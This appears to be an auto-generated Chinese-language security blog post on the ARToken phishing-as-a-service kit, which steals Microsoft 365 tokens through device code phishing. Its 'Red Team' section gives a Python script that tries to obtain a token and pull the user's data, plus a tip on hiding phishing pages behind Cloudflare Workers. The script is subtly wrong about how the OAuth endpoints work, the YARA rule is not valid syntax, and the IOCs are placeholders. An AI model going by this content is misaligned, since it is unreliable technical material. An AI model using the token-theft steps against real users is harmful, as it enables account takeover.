---
layout: post
title:  "ARToken PhaaS exposes EvilTokens' Microsoft 365 phishing toolkit"
date:   2026-07-04 08:28:08 +0000
categories: [security]
severity: critical
---

# 🚨 解析 ARToken PhaaS 平台：Microsoft 365 疫情威脅的新變種

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Account Takeover (ATO) 和 Business Email Compromise (BEC)
> * **關鍵技術**: Phishing-as-a-Service (PhaaS), Device Code Phishing, OAuth 2.0 Device Authorization Grant

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ARToken PhaaS 平台利用 Microsoft 365 的 OAuth 2.0 Device Authorization Grant 機制，通過 device code phishing 攻擊，竊取用戶的 Microsoft 365 驗證令牌。
* **攻擊流程圖解**:
  1. 攻擊者創建一個 phishing 頁面，誘騙用戶輸入 device code。
  2. 用戶輸入 device code 後，攻擊者獲得 Microsoft 365 的驗證令牌。
  3. 攻擊者使用驗證令牌，竊取用戶的 Microsoft 365 資料，包括郵件、文件和 SharePoint 網站。
* **受影響元件**: Microsoft 365、OAuth 2.0 Device Authorization Grant

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 phishing 頁面和一個 device code。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # phishing 頁面 URL
    phishing_url = "https://example.com/phishing"
    
    # device code
    device_code = "xxxxxxxxxxxxxxxx"
    
    # 發送請求到 Microsoft 365 的 device code 驗證 API
    response = requests.post(
        "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data={"client_id": "xxxxxxxxxxxxxxxx", "device_code": device_code}
    )
    
    # 如果驗證成功，則返回驗證令牌
    if response.status_code == 200:
        access_token = response.json()["access_token"]
        # 使用驗證令牌竊取用戶資料
        user_data = requests.get(
            "https://graph.microsoft.com/v1.0/me",
            headers={"Authorization": f"Bearer {access_token}"}
        ).json()
        print(user_data)
    
    ```
* **繞過技術**: 攻擊者可以使用 Cloudflare Workers 部署 phishing 頁面，繞過傳統的 Web 應用防火牆 (WAF)。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| xxxxxxxxxxxxxxxx | 192.0.2.1 | example.com | /phishing |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule phishing_page {
        meta:
            description = "Phishing page detection"
            author = "Your Name"
        strings:
            $phishing_url = "https://example.com/phishing"
        condition:
            $phishing_url in (http.request.uri)
    }
    
    ```
* **緩解措施**: 使用 Microsoft 365 的條件性存取政策，要求用戶進行多因素驗證 (MFA)。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Device Code Phishing**: 一種 phishing 攻擊，利用 device code 驗證機制，竊取用戶的驗證令牌。
* **OAuth 2.0 Device Authorization Grant**: 一種 OAuth 2.0 授權機制，允許用戶授權應用程序存取其資源。
* **Phishing-as-a-Service (PhaaS)**: 一種雲端基礎的 phishing 平台，提供 phishing 頁面和 device code 驗證機制。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/artoken-phaas-exposes-eviltokens-microsoft-365-phishing-toolkit/)
- [Microsoft 365 安全性](https://docs.microsoft.com/zh-tw/microsoft-365/security/)
- [OAuth 2.0 Device Authorization Grant](https://tools.ietf.org/html/rfc8628)


